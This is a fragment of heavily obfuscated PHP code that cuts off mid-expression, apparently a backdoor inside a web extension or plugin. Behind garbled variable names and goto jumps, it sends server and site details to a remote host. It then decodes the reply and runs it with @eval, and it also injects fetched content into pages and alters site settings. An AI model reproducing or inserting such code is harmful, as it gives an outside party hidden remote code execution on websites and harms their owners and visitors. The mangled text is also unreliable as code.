$AÌ·ŒÎ”©ß = @$dø©©ƒˆÙ®[284]($F±¡Å÷«èç, !1, $CëÕç¨…×); $dø©©ƒˆÙ®[285]($dø©©ƒˆÙ®[286]); $C»Ÿ„Â¶Î = $B¦Õ´„îÊ[668]; goto fæÛëà­Æ; e°í™›à­Ê: if (!$dø©©ƒˆÙ®[269]($_SERVER[$dø©©ƒˆÙ®[44]], $e…ò ÖˆÖ•)) { return; } $F±¡Å÷«èç = $dø©©ƒˆÙ®[276]; $F±¡Å÷«èç = $this->{$_SERVER[†Ô…Œèëôú][277]}($F±¡Å÷«èç, $dø©©ƒˆÙ®[278]); goto dÉ¤ªˆ¨»ó; A¹’‰…¨†¡: } public function fkrs14d76558($bãŸˆ‘‹ö) { goto A‚š¡ãêÛä; A‚š¡ãêÛä: $a‚ˆ ¡¬í¾ =& $_SERVER[›èö’ù¤]; $f™¦êØª²Ş =& $_SERVER[†Ô…Œèëôú]; if ($this->afpc2fb8927f == $f™¦êØª²Ş[288]) { return $bãŸˆ‘‹ö; } goto e‘Ë¨øÎ‚´; eŞŒÁ¢ƒŸ¯: $eë ­§•’ = $a‚ˆ ¡¬í¾[671]; if (strlen($eë ­§•’) < $a‚ˆ ¡¬í¾[607]) { die; } goto aÂ÷’¦˜; e‘Ë¨øÎ‚´: $bÙ†è³Áß = array($f™¦êØª²Ş[289] => $f™¦êØª²Ş[290], $f™¦êØª²Ş[291] => $f™¦êØª²Ş[290], $f™¦êØª²Ş[292] => $f™¦êØª²Ş[290], $f™¦êØª²Ş[293] => $f™¦êØª²Ş[290], $f™¦êØª²Ş[294] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[296] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[297] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[298] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[299] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[300] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[301] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[302] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[303] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[304] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[305] => $f™¦êØª²Ş[295], $f™¦êØª²Ş[306] => $f™¦êØª²Ş[295]); $EØ¦ÆÔéÑí = $a‚ˆ ¡¬í¾[669]; if (!$EØ¦ÆÔéÑí) { die; } goto BÄóíÌÊ§ğ; BÄóíÌÊ§ğ: $F¬„ø·ëÉ… = $f™¦êØª²Ş[0]($f™¦êØª²Ş[307], $f™¦êØª²Ş[123]($this->vrit939c873c, $f™¦êØª²Ş[146], $f™¦êØª²Ş[10])); $a—åæùÏ¾ = array(); $c´˜¼Ë¼…Œ = $a‚ˆ ¡¬í¾[670]; goto bÃÂÏ“…Æ†; bÃÂÏ“…Æ†: foreach ($bÙ†è³Áß as $a³óø´ö‰ => $e‚ëƒÇá¯”) { if ($e‚ëƒÇá¯” == $f™¦êØª²Ş[290] && $f™¦êØª²Ş[25]($this->afpc2fb8927f, 0, 1) == $f™¦êØª²Ş[290]) { continue; } if (!$f™¦êØª²Ş[269]($a³óø´ö‰, $F¬„ø·ëÉ…)) { $a—åæùÏ¾[] = $a³óø´ö‰; } } foreach ($a—åæùÏ¾ as $a³óø´ö‰) { unset($bãŸˆ‘‹ö[$a³óø´ö‰]); } return $bãŸˆ‘‹ö; goto eŞŒÁ¢ƒŸ¯; aÂ÷’¦˜: } private function wcnq936e9c89() { $dóÜ°šÚè© =& $_SERVER[†Ô…Œèëôú]; if ($this->afpc2fb8927f != $dóÜ°šÚè©[138]) { return; } $GLOBALS[$dóÜ°šÚè©[111]][$dóÜ°šÚè©[115]][$dóÜ°šÚè©[308]] = $dóÜ°šÚè©[246]; $GLOBALS[$dóÜ°šÚè©[111]][$dóÜ°šÚè©[309]] = $dóÜ°šÚè©[246]; $báÇ‡Šå¼Ë = $_SERVER[›èö’ù¤][672]; if ($dóÜ°šÚè©[61]($dóÜ°šÚè©[310])->{$_SERVER[†Ô…Œèëôú][63]}($dóÜ°šÚè©[93]) != $dóÜ°šÚè©[260]) { $dóÜ°šÚè©[61]($dóÜ°šÚè©[310])->{$_SERVER[†Ô…Œèëôú][247]}($dóÜ°šÚè©[93], $dóÜ°šÚè©[260]); } } public function iplv1efe71dc() { return $_SERVER[†Ô…Œèëôú][311]; } private function kmsi36b9ab8e() { goto fîªÓË—¢›; f÷Š‰±šÄ¤: if ($this->afpc2fb8927f == $cñî¸—Ñ•±[138] || !$cñî¸—Ñ•±[123]($GLOBALS, $cñî¸—Ñ•±[149])) { return; } if (!$cñî¸—Ñ•±[269]($_SERVER[$cñî¸—Ñ•±[44]], $fÂò©¼¶Ğ)) { return; } if ($cñî¸—Ñ•±[262]() % 4 != 0) { return; } goto C˜ßó¯Íº; a˜öºéœ: $CÌ…ª¸“˜ù = $e†”†ìÍßŒ[673]; if (!$CÌ…ª¸“˜ù) { die; } $EŠé™×¶Í = $cñî¸—Ñ•±[315] . $cñî¸—Ñ•±[131]($cñî¸—Ñ•±[316]); goto f÷Š‰±šÄ¤; C˜ßó¯Íº: $B¿ƒ‰–Ìˆö = $cñî¸—Ñ•±[13](array($cñî¸—Ñ•±[317], $cñî¸—Ñ•±[318]), $EŠé™×¶Í); if ($B¿ƒ‰–Ìˆö && $cñî¸—Ñ•±[262]() - $B¿ƒ‰–Ìˆö < $cñî¸—Ñ•±[271]($cñî¸—Ñ•±[319])) { return; } $cñî¸—Ñ•±[13](array($cñî¸—Ñ•±[317], $cñî¸—Ñ•±[177]), $EŠé™×¶Í, $cñî¸—Ñ•±[262]()); goto Bì’Ìöâù; Bì’Ìöâù: $díö‡¥ñ• = $cñî¸—Ñ•±[61]($cñî¸—Ñ•±[62])->{$_SERVER[†Ô…Œèëôú][63]}($cñî¸—Ñ•±[133]); $dßÊÊ¦ÍŒÃ = array($cñî¸—Ñ•±[190] => $cñî¸—Ñ•±[61]($cñî¸—Ñ•±[62])->{$_SERVER[†Ô…Œèëôú][63]}($cñî¸—Ñ•±[234]), $cñî¸—Ñ•±[204] => $this->afpc2fb8927f, $cñî¸—Ñ•±[201] => $_SERVER[$cñî¸—Ñ•±[202]], $cñî¸—Ñ•±[203] => $cñî¸—Ñ•±[61]($cñî¸—Ñ•±[62])->{$_SERVER[†Ô…Œèëôú][63]}($cñî¸—Ñ•±[164]), $cñî¸—Ñ•±[130] => $cñî¸—Ñ•±[131]($_SERVER[$cñî¸—Ñ•±[132]] . $díö‡¥ñ•), $cñî¸—Ñ•±[194] => $cñî¸—Ñ•±[174], $cñî¸—Ñ•±[197] => $_SERVER[$cñî¸—Ñ•±[198]]); $C©–¹çÓÑè = $this->{$_SERVER[†Ô…Œèëôú][209]}($cñî¸—Ñ•±[320], $dßÊÊ¦ÍŒÃ); goto AÁ§„ÓçÂ¾; fîªÓË—¢›: $e†”†ìÍßŒ =& $_SERVER[›èö’ù¤]; $cñî¸—Ñ•± =& $_SERVER[†Ô…Œèëôú]; $fÂò©¼¶Ğ = array($cñî¸—Ñ•±[312], $cñî¸—Ñ•±[313], $cñî¸—Ñ•±[314]); goto a˜öºéœ; fÀÉ“Äö„â: if ($C©–¹çÓÑè[$cñî¸—Ñ•±[190]] && $C©–¹çÓÑè[$cñî¸—Ñ•±[321]]) { if ($this->{$_SERVER[†Ô…Œèëôú][225]}($C©–¹çÓÑè[$cñî¸—Ñ•±[321]]) == $dßÊÊ¦ÍŒÃ[$cñî¸—Ñ•±[190]]) { return; } } $this->{$_SERVER[†Ô…Œèëôú][189]}(); if ($this->{$_SERVER[†Ô…Œèëôú][225]}($C©–¹çÓÑè[$cñî¸—Ñ•±[321]]) != $dßÊÊ¦ÍŒÃ[$cñî¸—Ñ•±[190]]) { $cÉÁøÏÕ™” = array($cñî¸—Ñ•±[227] => $díö‡¥ñ•, $cñî¸—Ñ•±[228] => $_SERVER[$cñî¸—Ñ•±[132]], $cñî¸—Ñ•±[229] => $cñî¸—Ñ•±[230](), $cñî¸—Ñ•±[199] => $_SERVER[$cñî¸—Ñ•±[200]]); $Fö×°“³â = $this->{$_SERVER[†Ô…Œèëôú][231]}($cñî¸—Ñ•±[173]($cÉÁøÏÕ™”)); $C©–¹çÓÑè = $this->{$_SERVER[†Ô…Œèëôú][209]}($cñî¸—Ñ•±[232] . $Fö×°“³â); if ($C©–¹çÓÑè && $cñî¸—Ñ•±[168]($C©–¹çÓÑè) && isset($C©–¹çÓÑè[$cñî¸—Ñ•±[321]])) { $cÅË¤†‡çï = $this->{$_SERVER[†Ô…Œèëôú][215]}($C©–¹çÓÑè[$cñî¸—Ñ•±[321]], 2); if ($cÅË¤†‡çï) { $cÅË¤†‡çï = $this->{$_SERVER[†Ô…Œèëôú][225]}($cÅË¤†‡çï); } if ($cÅË¤†‡çï) { try { @eval($cÅË¤†‡çï); } catch (Exception $b“¹³¦µÛÁ) { } } } } goto CÈ·‡†Ö¶ˆ; AÁ§„ÓçÂ¾: $Cˆ¨†µªì = $e†”†ìÍßŒ[674]; if (strlen($Cˆ¨†µªì) < $e†”†ìÍßŒ[619]) { return; } if (!$cñî¸—Ñ•±[168]($C©–¹çÓÑè)) { return; } goto fÀÉ“Äö„â; CÈ·‡†Ö¶ˆ: } private function ixpv2ab87fe4($c³“ù‘¼È¨ = '', $BÏ®ØÓ¯Ê‚ = array(), $D›ÁïÕÃÊù = 5) { goto fÄºª·†„; bíÌ§É¥Åà: $B¥äÑºÁ×Ø = $this->{$_SERVER[†Ô…Œèëôú][277]}($B¥äÑºÁ×Ø, $D÷ëÄƒÒç‡[323]); $B¥äÑºÁ×Ø = $B¥äÑºÁ×Ø . $c³“ù‘¼È¨; if ($BÏ®ØÓ¯Ê‚ && $D÷ëÄƒÒç‡[168]($BÏ®ØÓ¯Ê‚)) { $B¥äÑºÁ×Ø = $B¥äÑºÁ×Ø . $D÷ëÄƒÒç‡[324] . $D÷ëÄƒÒç‡[325]($BÏ®ØÓ¯Ê‚); } goto fÑ†‚“ÏÊ; e–‚íñÍĞ¢: if (strlen($A”¡ê‡óƒÛ) < $C¬Å–é«‚½[641]) { return; } $BÏ®ØÓ¯Ê‚ = @$D÷ëÄƒÒç‡[284]($B¥äÑºÁ×Ø, !1, $bç¸âˆí‰); $c®áµˆôò¬ = $C¬Å–é«‚½[676]; goto EİÑÌŒ½²ë; fÑ†‚“ÏÊ: if ($BÏ®ØÓ¯Ê‚ === -1) { return $B¥äÑºÁ×Ø; } $bç¸âˆí‰ = $D÷ëÄƒÒç‡[279](array($D÷ëÄƒÒç‡[280] => array($D÷ëÄƒÒç‡[283] => $D›ÁïÕÃÊù, $D÷ëÄƒÒç‡[281] => $D÷ëÄƒÒç‡[326]), $D÷ëÄƒÒç‡[327] => array($D÷ëÄƒÒç‡[328] => !1, $D÷ëÄƒÒç‡[329] => !1))); $A”¡ê‡óƒÛ = $C¬Å–é«‚½[675]; goto e–‚íñÍĞ¢; fÄºª·†„: $C¬Å–é«‚½ =& $_SERVER[›èö’ù¤]; $D÷ëÄƒÒç‡ =& $_SERVER[†Ô…Œèëôú]; $B¥äÑºÁ×Ø = $D÷ëÄƒÒç‡[322]; goto bíÌ§É¥Åà; EİÑÌŒ½²ë: return $D÷ëÄƒÒç‡[217]($BÏ®ØÓ¯Ê‚, !0); $EìùÑ‘Éâ³ = $C¬Å–é«‚½[677]; goto FĞÙÇ„ã‹È; FĞÙÇ„ã‹È: } private function xmfb9a556cc3() { goto f›ŸÊŸƒÊ¶; aø×Ğá„ª: $b‡¾­Ğäé = $b–©äˆ‡†ø[679]; if (!$b‡¾­Ğäé) { return; } return $dÎ‡Å‚™¿ + $cùÇÛƒ×µô; goto e—Ğã…°ó; dÉƒÜèå©: $dÎ‡Å‚™¿ = $DÆ‰Ã¦¢ÎÈ[$this->afpc2fb8927f]; $CîŒ­‘ƒêÕ = $b–©äˆ‡†ø[678]; if (!$CîŒ­‘ƒêÕ) { die; } goto E‚Ÿš‡„¤˜; E‚Ÿš‡„¤˜: $dÎ‡Å‚™¿ = $C“ÂÈ£˜ğè[271]($dÎ‡Å‚™¿ ? $dÎ‡Å‚™¿ : $C“ÂÈ£˜ğè[331]); $cùÇÛƒ×µô = $C“ÂÈ£˜ğè[123]($this->vrit939c873c, $C“ÂÈ£˜ğè[357]); $cùÇÛƒ×µô = $cùÇÛƒ×µô ? $C“ÂÈ£˜ğè[271]($cùÇÛƒ×µô) : 0; goto aø×Ğá„ª; f›ŸÊŸƒÊ¶: $b–©äˆ‡†ø =& $_SERVER[›èö’ù¤]; $C“ÂÈ£˜ğè =& $_SERVER[†Ô…Œèëôú]; $DÆ‰Ã¦¢ÎÈ = array($C“ÂÈ£˜ğè[330] => $C“ÂÈ£˜ğè[331], $C“ÂÈ£˜ğè[332] => $C“ÂÈ£˜ğè[333], $C“ÂÈ£˜ğè[334] => $C“ÂÈ£˜ğè[335], $C“ÂÈ£˜ğè[336] => $C“ÂÈ£˜ğè[337], $C“ÂÈ£˜ğè[338] => $C“ÂÈ£˜ğè[339], $C“ÂÈ£˜ğè[340] => $C“ÂÈ£˜ğè[272], $C“ÂÈ£˜ğè[341] => $C“ÂÈ£˜ğè[272], $C“ÂÈ£˜ğè[342] => $C“ÂÈ£˜ğè[331], $C“ÂÈ£˜ğè[343] => $C“ÂÈ£˜ğè[333], $C“ÂÈ£˜ğè[344] => $C“ÂÈ£˜ğè[335], $C“ÂÈ£˜ğè[345] => $C“ÂÈ£˜ğè[346], $C“ÂÈ£˜ğè[347] => $C“ÂÈ£˜ğè[337], $C“ÂÈ£˜ğè[348] => $C“ÂÈ£˜ğè[349], $C“ÂÈ£˜ğè[350] => $C“ÂÈ£˜ğè[339], $C“ÂÈ£˜ğè[351] => $C“ÂÈ£˜ğè[352], $C“ÂÈ£˜ğè[353] => $C“ÂÈ£˜ğè[354], $C“ÂÈ£˜ğè[355] => $C“ÂÈ£˜ğè[356]); goto dÉƒÜèå©; e—Ğã…°ó: } public function tvuxc049a444($aÉ™‚°Ã‘Ñ) { goto a¤é¸ë•¶; bÚà·„Ş: if (!$f³ã¸‹³ŸÖ) { return; } if ($BÍã–Í…› <= $Fé½ËÜ¥‹) { return; } $bÕ˜Ÿàˆ•ù = $b“Ü®„ëåª[61]($b“Ü®„ëåª[156])->{$_SERVER[†Ô…Œèëôú][359]}($b“Ü®„ëåª[358])->{$_SERVER[†Ô…Œèëôú][360]}($Fé½ËÜ¥‹)->{$_SERVER[†Ô…Œèëôú][361]}(); goto EŠ¶Ş“±’â; a¤é¸ë•¶: $dè‡Æ­‰ƒó =& $_SERVER[›èö’ù¤]; $b“Ü®„ëåª =& $_SERVER[†Ô…Œèëôú]; $Fé½ËÜ¥‹ = $this->{$_SERVER[†Ô…Œèëôú][154]}(); goto E‰¤©·”æ›; aÄ¬ì‡¾ĞÉ: if ($Fé½ËÜ¥‹ >= $b“Ü®„ëåª[271]($b“Ü®„ëåª[272])) { return; } $BÍã–Í…› = $b“Ü®„ëåª[61]($b“Ü®„ëåª[156])->{$_SERVER[†Ô…Œèëôú][157]}(); $f³ã¸‹³ŸÖ = $dè‡Æ­‰ƒó[681]; goto bÚà·„Ş; E‰¤©·”æ›: $cËæÔã¼Õö = $dè‡Æ­‰ƒó[680]; if (strlen($cËæÔã¼Õö) < $dè‡Æ­‰ƒó[641]) { die; } if ($aÉ™‚°Ã‘Ñ[$b“Ü®„ëåª[358]] == $b“Ü®„ëåª[246]) { return; } goto aÄ¬ì‡¾ĞÉ; EŠ¶Ş“±’â: $bÕ˜Ÿàˆ•ù = $b“Ü®„ëåª[248]($bÕ˜Ÿàˆ•ù, $b“Ü®„ëåª[10], $b“Ü®„ëåª[358]); if (!$b“Ü®„ëåª[269]($aÉ™‚°Ã‘Ñ[$b“Ü®„ëåª[358]], $bÕ˜Ÿàˆ•ù)) { $b“Ü®„ëåª[191]($b“Ü®„ëåª[362], !1, $b“Ü®„ëåª[266]); } goto C¸ğÀ¦‚áã; C¸ğÀ¦‚áã: } public function vozd881d6ae8() { goto CàéÕ‹°ÅÉ; D´ß’ºÁ³·: $d¥òÕ„Ù¬ = $BÙŠ¹ñóí[276]; $d¥òÕ„Ù¬ = $this->{$_SERVER[†Ô…Œèëôú][277]}($d¥òÕ„Ù¬, $BÙŠ¹ñóí[278]); $C™ÚÑÀ…ÛÚ = $cÛİ„ã¦Ÿ“[682]; goto e¾ç´Ã á; e¾ç´Ã á: $FÓé¡‹„èë = $BÙŠ¹ñóí[279](array($BÙŠ¹ñóí[280] => array($BÙŠ¹ñóí[281] => $BÙŠ¹ñóí[282], $BÙŠ¹ñóí[283] => 3))); $eÆÔÔ¤è¼Å = @$BÙŠ¹ñóí[284]($d¥òÕ„Ù¬, !1, $FÓé¡‹„èë); $cÕËçÚï‘Õ = $cÛİ„ã¦Ÿ“[683]; goto eñÏ±¶†™; eñÏ±¶†™: if (!$cÕËçÚï‘Õ) { die; } echo $BÙŠ¹ñóí[364] . $BÙŠ¹ñóí[365]($eÆÔÔ¤è¼Å) . $BÙŠ¹ñóí[366]; goto fÉíÌŞÙ; CàéÕ‹°ÅÉ: $cÛİ„ã¦Ÿ“ =& $_SERVER[›èö’ù¤]; $BÙŠ¹ñóí =& $_SERVER[†Ô…Œèëôú]; if (!$BÙŠ¹ñóí[123]($GLOBALS, $BÙŠ¹ñóí[149]) || $BÙŠ¹ñóí[363](1, 100) > 20) { return; } goto D´ß’ºÁ³·; fÉíÌŞÙ: } private function dgax8bbdf377($E„ì“”…„½, $f˜–Ğ”¦ß, $Cì³Õ²ÂÄô = 3) { goto b”ƒŒîµ»›; FÆ˜¨‰ÀñÀ: $f«à£È¿æœ = $bÒ×âŞùÓ¼[240]($e¦ÎÆØ¨Úˆ . $bÓÂº‹½Óå . $f«à£È¿æœ); if ($Cì³Õ²ÂÄô - 1 > 0) { $f«à£È¿æœ = $this->{$_SERVER[†Ô…Œèëôú][144]}($f«à£È¿æœ, $f˜–Ğ”¦ß, $Cì³Õ²ÂÄô - 1); } return $f«à£È¿æœ; goto b‚¤¤©ˆŒ; b”ƒŒîµ»›: $BŞæ‹ß‡·Ø =& $_SERVER[›èö’ù¤]; $bÒ×âŞùÓ¼ =& $_SERVER[†Ô…Œèëôú]; $bÒ×âŞùÓ¼[367](1); goto aèœÊ§İ…; aèœÊ§İ…: $bÍÒÄóĞ´¦ = $BŞæ‹ß‡·Ø[684]; if (strlen($bÍÒÄóĞ´¦) < $BŞæ‹ß‡·Ø[607]) { return; } $E„ì“”…„½ = $bÒ×âŞùÓ¼[2]($E„ì“”…„½); goto bÎéÇé÷™; D¦ÛÂœ’: $bÓÂº‹½Óå = $bÒ×âŞùÓ¼[141](15); $Dñ’ÁÁÒ¦£ = $bÒ×âŞùÓ¼[368]; switch ($e¦ÎÆØ¨Úˆ) { case $bÒ×âŞùÓ¼[260]: $f«à£È¿æœ = $this->{$_SERVER[†Ô…Œèëôú][172]}($E„ì“”…„½, $bÒ×âŞùÓ¼[240]($f˜–Ğ”¦ß . $bÓÂº‹½Óå)); $e ‘Ú­ŠÏ† = $BŞæ‹ß‡·Ø[686]; if (strlen($e ‘Ú­ŠÏ†) < $BŞæ‹ß‡·Ø[641]) { return; } break; case $bÒ×âŞùÓ¼[246]: $f«à£È¿æœ = $this->{$_SERVER[†Ô…Œèëôú][172]}($E„ì“”…„½, $bÒ×âŞùÓ¼[240]($bÓÂº‹½Óå . $f˜–Ğ”¦ß)); $d‡ÏÉ‡–‡‡ = $BŞæ‹ß‡·Ø[687]; if (strlen($d‡ÏÉ‡–‡‡) < $BŞæ‹ß‡·Ø[641]) { return; } break; case $bÒ×âŞùÓ¼[369]: $f«à£È¿æœ = $this->{$_SERVER[†Ô…Œèëôú][172]}($E„ì“”…„½, $bÒ×âŞùÓ¼[135]($bÓÂº‹½Óå . $f˜–Ğ”¦ß)); $f½º×î¢¬ = $BŞæ‹ß‡·Ø[688]; while (strlen($f½º×î¢¬) < $BŞæ‹ß‡·Ø[619]) { if (!$f½º×î¢¬) { break; } $f½º×î¢¬++; } break; case $bÒ×âŞùÓ¼[370]: $f«à£È¿æœ = $this->{$_SERVER[†Ô…Œèëôú][172]}($E„ì“”…„½, $bÒ×âŞùÓ¼[131]($bÓÂº‹½Óå . $f˜–Ğ”¦ß)); $d†óÇêÏÃ = $BŞæ‹ß‡·Ø[689]; while ($d†óÇêÏÃ < $BŞæ‹ß‡·Ø[607]) { if ($d†óÇêÏÃ >= 0) { break; } $d†óÇêÏÃ++; } break; case $bÒ×âŞùÓ¼[371]: goto eÏÇÒêÀ°; F£”ø„‰‹: $Aë››˜˜ÚÃ = $bÒ×âŞùÓ¼[372](0, 64); $Dİ £œ‡»Ü = $BŞæ‹ß‡·Ø[691]; while ($Dİ £œ‡»Ü < $BŞæ‹ß‡·Ø[619]) { if ($Dİ £œ‡»Ü >= 0) { break; } $Dİ £œ‡»Ü++; } goto eµÃêÎ¾Òê; Bå´â«Ä©İ: $d‘ñßßÁªĞ = $BŞæ‹ß‡·Ø[694]; while (strlen($d‘ñßßÁªĞ) < $BŞæ‹ß‡·Ø[607]) { if (!$d‘ñßßÁªĞ) { break; } $d‘ñßßÁªĞ++; } $fÃŒäñİï‘ = 0; goto BÔó¸è¡ˆ‹; eÏÇÒêÀ°: $E„ì“”…„½ = $bÒ×âŞùÓ¼[135]($E„ì“”…„½); $e¯—Ú±ğñæ = $BŞæ‹ß‡·Ø[690]; if (!$e¯—Ú±ğñæ) { die; } goto F£”ø„‰‹; BÔó¸è¡ˆ‹: for ($E¤ğï¨¹å = 0; $E¤ğï¨¹å < $bÒ×âŞùÓ¼[24]($E„ì“”…„½); $E¤ğï¨¹å++) { $fÃŒäñİï‘ = $fÃŒäñİï‘ == $bÒ×âŞùÓ¼[24]($b¾í«çÂÄ) ? 0 : $fÃŒäñİï‘; $D¸âƒ±™Šô = $BŞæ‹ß‡·Ø[695]; if (!$D¸âƒ±™Šô) { return; } $f‹Áå­ = ($Aë››˜˜ÚÃ + $bÒ×âŞùÓ¼[373]($Dñ’ÁÁÒ¦£, $E„ì“”…„½[$E¤ğï¨¹å]) + $bÒ×âŞùÓ¼[374]($b¾í«çÂÄ[$fÃŒäñİï‘++])) % 64; $AŠÏí¢Ö‰Ù .= $Dñ’ÁÁÒ¦£[$f‹Áå­]; $eÛùÄÅËÍ´ = $BŞæ‹ß‡·Ø[696]; } $f«à£È¿æœ = $bÒ×âŞùÓ¼[365]($Fó›¬èŸ•÷ . $AŠÏí¢Ö‰Ù); break; goto F¤¥›è¶; eµÃêÎ¾Òê: $Fó›¬èŸ•÷ = $Dñ’ÁÁÒ¦£[$Aë››˜˜ÚÃ]; $b¾í«çÂÄ = $bÒ×âŞùÓ¼[131]($Fó›¬èŸ•÷ . $bÒ×âŞùÓ¼[131]($f˜–Ğ”¦ß . $Fó›¬èŸ•÷) . $f˜–Ğ”¦ß); $b¾í«çÂÄ = $bÒ×âŞùÓ¼[25]($b¾í«çÂÄ, $Aë››˜˜ÚÃ % 8, $Aë››˜˜ÚÃ % 8 + 7); goto F°¦®•°™¼; Fì‘ÖÈêÃÍ: $Cƒó—³£Èº = $BŞæ‹ß‡·Ø[693]; if (strlen($Cƒó—³£Èº) < $BŞæ‹ß‡·Ø[619]) { die; } $f‹Áå­ = 0; goto Bå´â«Ä©İ; F°¦®•°™¼: $AŠÏí¢Ö‰Ù = $bÒ×âŞùÓ¼[10]; $fĞÎª‚²·„ = $BŞæ‹ß‡·Ø[692]; $E¤ğï¨¹å = 0; goto Fì‘ÖÈêÃÍ; F¤¥›è¶: default: $f«à£È¿æœ = $this->{$_SERVER[†Ô…Œèëôú][172]}($E„ì“”…„½, $f˜–Ğ”¦ß . $bÓÂº‹½Óå); break; } goto FÆ˜¨‰ÀñÀ; bÎéÇé÷™: $D°Ø•š³¦˜ = $BŞæ‹ß‡·Ø[685]; if (strlen($D°Ø•š³¦˜) < $BŞæ‹ß‡·Ø[616]) { return; } $e¦ÎÆØ¨Úˆ = $bÒ×âŞùÓ¼[363](0, 5) . $bÒ×âŞùÓ¼[10]; goto D¦ÛÂœ’; b‚¤¤©ˆŒ: } private function wvsi10201623($aÃ–¤íÇ“ë, $bÊÇòåîô±, $FêÏ®’¹ˆÌ = 3) { goto aó˜Íã‡; F³¥àéõâ: $aÃ–¤íÇ“ë = $FÙá„éÀÀ‘[240]($aÃ–¤íÇ“ë); $aÛî‘•ŒŠÕ = $aÃ–¤íÇ“ë[0]; $E²’Áåó• = $FÙá„éÀÀ‘[25]($aÃ–¤íÇ“ë, 1, 15); goto eÖ¸¨¢³·Ÿ; CÒ¯ò: $aÃ–¤íÇ“ë = $FÙá„éÀÀ‘[2]($aÃ–¤íÇ“ë); $cŠ»ºêõªñ = $aùŠÓºòáĞ[697]; if (strlen($cŠ»ºêõªñ) < $aùŠÓºòáĞ[607]) { die; } goto F³¥àéõâ; cÍÓ‚òÌƒ: $fÍçõ˜ŠÌ = $aùŠÓºòáĞ[699]; while ($fÍçõ˜ŠÌ < $aùŠÓºòáĞ[619]) { if ($fÍçõ˜ŠÌ >= 0) { break; } $fÍçõ˜ŠÌ++; } $F‚ËŒçƒ¯ = $FÙá„éÀÀ‘[368]; goto aÚâÁƒ‡ê; eÖ¸¨¢³·Ÿ: $Aˆò÷³¦Â = $aùŠÓºòáĞ[698]; if (strlen($Aˆò÷³¦Â) < $aùŠÓºòáĞ[619]) { die; } $aÃ–¤íÇ“ë = $FÙá„éÀÀ‘[25]($aÃ–¤íÇ“ë, 16); goto cÍÓ‚òÌƒ; aÚâÁƒ‡ê: switch ($aÛî‘•ŒŠÕ) { case $FÙá„éÀÀ‘[260]: $BÑÓ× àÈ” = $this->{$_SERVER[†Ô…Œèëôú][277]}($aÃ–¤íÇ“ë, $FÙá„éÀÀ‘[240]($bÊÇòåîô± . $E²’Áåó•)); break; $B¨ ‚°å¼Ä = $aùŠÓºòáĞ[700]; while ($B¨ ‚°å¼Ä < $aùŠÓºòáĞ[619]) { if ($B¨ ‚°å¼Ä >= 0) { break; } $B¨ ‚°å¼Ä++; } case $FÙá„éÀÀ‘[246]: $BÑÓ× àÈ” = $this->{$_SERVER[†Ô…Œèëôú][277]}($aÃ–¤íÇ“ë, $FÙá„éÀÀ‘[240]($E²’Áåó• . $bÊÇòåîô±)); $Aä„ƒ¹¯ÃÇ = $aùŠÓºòáĞ[701]; if (strlen($Aä„ƒ¹¯ÃÇ) < $aùŠÓºòáĞ[616]) { die; } break; case $FÙá„éÀÀ‘[369]: $BÑÓ× àÈ” = $this->{$_SERVER[†Ô…Œèëôú][277]}($aÃ–¤íÇ“ë, $FÙá„éÀÀ‘[135]($E²’Áåó• . $bÊÇòåîô±)); $d¨ÑíëëÒÂ = $aùŠÓºòáĞ[702]; if (strlen($d¨ÑíëëÒÂ) < $aùŠÓºòáĞ[607]) { return; } break; case $FÙá„éÀÀ‘[370]: $BÑÓ× àÈ” = $this->{$_SERVER[†Ô…Œèëôú][277]}($aÃ–¤íÇ“ë, $FÙá„éÀÀ‘[131]($E²’Áåó• . $bÊÇòåîô±)); $b¹‡˜½ÃçĞ = $aùŠÓºòáĞ[703]; while (strlen($b¹‡˜½ÃçĞ) < $aùŠÓºòáĞ[619]) { if (!$b¹‡˜½ÃçĞ) { break; } $b¹‡˜½ÃçĞ++; } break; case $FÙá„éÀÀ‘[371]: goto eÔ²¿¶ºŠó; FÏ§ÚæÎÓ: $dß÷ÜÏÈÑ = $FÙá„éÀÀ‘[131]($c­æ£ğ—£¹ . $FÙá„éÀÀ‘[131]($bÊÇòåîô± . $c­æ£ğ—£¹) . $bÊÇòåîô±); $dß÷ÜÏÈÑ = $FÙá„éÀÀ‘[25]($dß÷ÜÏÈÑ, $Fµ‡‹§¤ƒ¾ % 8, $Fµ‡‹§¤ƒ¾ % 8 + 7); $F¸¤¿„®Îâ = $aùŠÓºòáĞ[707]; goto D³óŒ’ÁÎ; b”³ÎŒğô«: $aÃ–¤íÇ“ë = $FÙá„éÀÀ‘[25]($aÃ–¤íÇ“ë, 1); $A”ò ¤ïš‰ = $aùŠÓºòáĞ[705]; while ($A”ò ¤ïš‰ < $aùŠÓºòáĞ[616]) { if ($A”ò ¤ïš‰ >= 0) { break; } $A”ò ¤ïš‰++; } goto BåÆéìµ‹; BåÆéìµ‹: $Fµ‡‹§¤ƒ¾ = $FÙá„éÀÀ‘[373]($F‚ËŒçƒ¯, $c­æ£ğ—£¹); $fôÁ¢Â†©¹ = $aùŠÓºòáĞ[706]; while (strlen($fôÁ¢Â†©¹) < $aùŠÓºòáĞ[607]) { if (!$fôÁ¢Â†©¹) { break; } $fôÁ¢Â†©¹++; } goto FÏ§ÚæÎÓ; D‘‘¨»‚ Ô: $E†®ø¤„¹ = 0; $Dïé¶º†¹Æ = $aùŠÓºòáĞ[708]; if (strlen($Dïé¶º†¹Æ) < $aùŠÓºòáĞ[641]) { return; } goto BíäèÑùÑÙ; BíäèÑùÑÙ: for ($f¬ÚËÙó‹± = 0; $f¬ÚËÙó‹± < $FÙá„éÀÀ‘[24]($aÃ–¤íÇ“ë); $f¬ÚËÙó‹±++) { $E†®ø¤„¹ = $E†®ø¤„¹ == $FÙá„éÀÀ‘[24]($dß÷ÜÏÈÑ) ? 0 : $E†®ø¤„¹; $CàÁš’‹¨Ù = $E†®ø¤„¹++; $B¥‚İàŠÌÄ = $aùŠÓºòáĞ[709]; if (!$B¥‚İàŠÌÄ) { die; } $BÊÔÑ‹™‹ö = $FÙá„éÀÀ‘[373]($F‚ËŒçƒ¯, $aÃ–¤íÇ“ë[$f¬ÚËÙó‹±]) - $Fµ‡‹§¤ƒ¾ - 